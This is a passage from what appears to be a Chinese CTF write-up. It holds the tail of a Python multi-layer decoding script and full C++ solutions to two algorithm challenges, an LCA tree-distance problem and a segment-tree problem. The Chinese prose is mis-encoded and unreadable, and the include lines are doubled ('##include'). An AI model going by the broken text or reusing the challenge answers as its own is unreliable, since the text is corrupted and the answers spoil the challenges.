</span></span><span class="line"><span class="cl">        <span class="n">point</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ERROR OR SUCCESS!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;secret.txt&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">EncoderSet</span><span class="p">[</span><span class="n">point</span><span class="p">](</span><span class="n">s</span><span class="p">[</span><span class="n">n</span><span class="o">+</span><span class="mi">6</span><span class="p">:])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></div><p>ç„¶å!!! æˆ‘å°±è¿·èŒ«äº†&hellip; æ— è®ºå¦‚ä½•éƒ½åŒ¹é…ä¸ä¸Š.. å¾ªç¯åªæ‰§è¡Œä¸€éä¸åšä»»ä½•å¤„ç†å°±ä¼šé€€å‡º..</p>
<p>äºæ˜¯&hellip; æ€ä¹ˆèƒ½æ”¾å¼ƒå‘¢?!</p>
<p>æˆ‘å°±æ”¹åŠ¨äº†ä¸€ä¸‹, æŠŠå¾ªç¯å»æ‰, ç„¶åäººçœ¼è¯†åˆ«, æ‰‹åŠ¨ä¿®æ”¹è§£ç æ–¹å¼å’Œä½ç½®&hellip; æ‰‹æ’•äº†ä¸‰åä¸€å±‚, å¾—åˆ°<code>flag</code>.</p>
<h3 id="tree-distance">Tree Distance</h3>
<p>æƒ³è®©æˆ‘å†™ç®—æ³•è§£é‡Šå—? ä¸å¯èƒ½çš„&hellip; æˆ‘è¿˜æƒ³å¤šæ´»å‡ å¹´&hellip; æˆ‘æŠŠä»£ç æ”¾å‡ºæ¥å§&hellip;</p>
<p>ç®—æ³•æ˜¯å€å¢æ±‚LCA, å¯ä»¥ç™¾åº¦äº†è§£ä¸€ä¸‹.</p>
<p>( å…¶å®æœ¬é¢˜æœ€å¼€å§‹æ˜¯ç½‘ç»œç‰ˆçš„, ç½‘ç»œç‰ˆæ•°æ®ç®€å•å¾—å¤šå¹¶ä¸”æ²¡æœ‰æ—¶é—´é™åˆ¶, å¯æƒœæˆ‘ä¸ä¼šç½‘ç»œç¼–ç¨‹, äºæ˜¯å°±èµ°ä¸Šäº†OJè¿™æ¡ä¸å½’ä¹‹è·¯ T_T , æ•°æ®å¤ªå‘äººäº† )</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// å†è¿‡ä¸äº†æˆ‘å°±æ¢åœ°æ–¹é‡å†™QAQ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##include &lt;cstdio&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstring&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">int</span> <span class="n">maxn</span> <span class="o">=</span> <span class="mf">5e5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">int</span> <span class="n">maxm</span> <span class="o">=</span> <span class="mf">8e5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="nc">node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">to</span><span class="p">,</span> <span class="n">next</span><span class="p">,</span> <span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">edges</span><span class="p">[</span><span class="n">maxm</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">head</span><span class="p">[</span><span class="n">maxn</span><span class="p">],</span> <span class="n">cnt</span><span class="p">,</span> <span class="n">dp</span><span class="p">[</span><span class="n">maxn</span><span class="p">][</span><span class="mi">20</span><span class="p">],</span> <span class="n">dep</span><span class="p">[</span><span class="n">maxn</span><span class="p">],</span> <span class="n">dist</span><span class="p">[</span><span class="n">maxn</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">addedge</span><span class="p">(</span><span class="kt">int</span> <span class="n">u</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">,</span> <span class="kt">int</span> <span class="n">w</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">to</span> <span class="o">=</span> <span class="n">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">to</span> <span class="o">=</span> <span class="n">u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">w</span> <span class="o">=</span> <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">w</span> <span class="o">=</span> <span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span><span class="p">].</span><span class="n">next</span> <span class="o">=</span> <span class="n">head</span><span class="p">[</span><span class="n">u</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">edges</span><span class="p">[</span><span class="n">cnt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="n">next</span> <span class="o">=</span> <span class="n">head</span><span class="p">[</span><span class="n">v</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">head</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">=</span> <span class="n">cnt</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">head</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">=</span> <span class="n">cnt</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">dfs</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">dep</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="o">=</span> <span class="n">dep</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dp</span><span class="p">[</span><span class="n">s</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">dep</span><span class="p">[</span><span class="n">s</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dp</span><span class="p">[</span><span class="n">s</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">dp</span><span class="p">[</span><span class="n">s</span><span class="p">][</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]][</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">head</span><span class="p">[</span><span class="n">s</span><span class="p">];</span> <span class="n">i</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">edges</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">edges</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">to</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">t</span> <span class="o">==</span> <span class="n">x</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">dist</span><span class="p">[</span><span class="n">t</span><span class="p">]</span> <span class="o">=</span> <span class="n">dist</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="o">+</span> <span class="n">edges</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">dfs</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">LCA</span><span class="p">(</span><span class="kt">int</span> <span class="n">u</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dep</span><span class="p">[</span><span class="n">v</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">dep</span><span class="p">[</span><span class="n">u</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">u</span> <span class="o">^=</span> <span class="n">v</span> <span class="o">^=</span> <span class="n">u</span> <span class="o">^=</span> <span class="n">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">dep</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">-</span> <span class="n">dep</span><span class="p">[</span><span class="n">v</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">u</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">u</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">u</span> <span class="o">==</span> <span class="n">v</span><span class="p">)</span> <span class="k">return</span> <span class="n">u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">dep</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">dp</span><span class="p">[</span><span class="n">u</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">dp</span><span class="p">[</span><span class="n">v</span><span class="p">][</span><span class="n">i</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">u</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">u</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="n">v</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">v</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">dp</span><span class="p">[</span><span class="n">u</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">WDNMD</span><span class="p">(</span><span class="kt">int</span> <span class="n">u</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">z</span> <span class="o">=</span> <span class="n">LCA</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">dist</span><span class="p">[</span><span class="n">u</span><span class="p">]</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">dist</span><span class="p">[</span><span class="n">z</span><span class="p">]</span> <span class="o">+</span> <span class="n">dist</span><span class="p">[</span><span class="n">v</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">m</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">memset</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">head</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">w</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">addedge</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">);</span> <span class="c1">// å¼ºè¡Œæ— å‘...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">dep</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dp</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dfs</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">m</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">WDNMD</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="f1gs-diamond">F1@gâ€˜s diamond</h3>
<p>ä»£ç ä¸€æ‰”æˆ‘å°±æºœ~</p>
<p>ç®—æ³•æ˜¯çº¿æ®µæ ‘, åŒºé—´ç»´æŠ¤.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include&lt;cstdio&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstring&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">int</span> <span class="n">INF</span> <span class="o">=</span> <span class="mf">1e9</span> <span class="o">+</span> <span class="mi">7</span><span class="p">,</span> <span class="n">MAXN</span> <span class="o">=</span> <span class="mf">5e5</span> <span class="o">+</span> <span class="mi">10</span><span class="p">,</span> <span class="n">MAXNODE</span> <span class="o">=</span> <span class="n">MAXN</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">,</span> <span class="n">MAXM</span> <span class="o">=</span> <span class="mf">1e5</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">N</span><span class="p">,</span> <span class="n">M</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">LL</span> <span class="n">tmp</span><span class="p">[</span><span class="n">MAXN</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="nc">node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LL</span> <span class="n">sum</span><span class="p">,</span> <span class="n">maxl</span><span class="p">,</span> <span class="n">maxr</span><span class="p">,</span> <span class="n">maxv</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">node</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">sum</span> <span class="o">=</span> <span class="n">maxl</span> <span class="o">=</span> <span class="n">maxr</span> <span class="o">=</span> <span class="n">maxv</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">A</span><span class="p">[</span><span class="n">MAXNODE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">inline</span> <span class="kt">void</span> <span class="nf">push_up</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">sum</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">sum</span> <span class="o">+</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxl</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxl</span><span class="p">,</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">sum</span> <span class="o">+</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxv</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxr</span> <span class="o">+</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxl</span><span class="p">,</span> <span class="n">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxv</span><span class="p">,</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxv</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxr</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxr</span><span class="p">,</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">].</span><span class="n">maxr</span> <span class="o">+</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">].</span><span class="n">sum</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">l</span><span class="p">,</span> <span class="kt">int</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">l</span> <span class="o">==</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">sum</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxl</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxr</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxv</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">[</span><span class="n">l</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">init</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">mid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">init</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">push_up</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">l</span><span class="p">,</span> <span class="kt">int</span> <span class="n">r</span><span class="p">,</span> <span class="kt">int</span> <span class="n">q</span><span class="p">,</span> <span class="n">LL</span> <span class="n">c</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">l</span> <span class="o">==</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">l</span> <span class="o">==</span> <span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">sum</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxl</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxr</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxv</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">q</span> <span class="o">&lt;=</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">update</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="n">update</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">push_up</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">node</span> <span class="nf">query</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">l</span><span class="p">,</span> <span class="kt">int</span> <span class="n">r</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ql</span><span class="p">,</span> <span class="kt">int</span> <span class="n">qr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ql</span> <span class="o">&lt;=</span> <span class="n">l</span> <span class="o">&amp;&amp;</span> <span class="n">r</span> <span class="o">&lt;=</span> <span class="n">qr</span><span class="p">)</span> <span class="p">{</span>
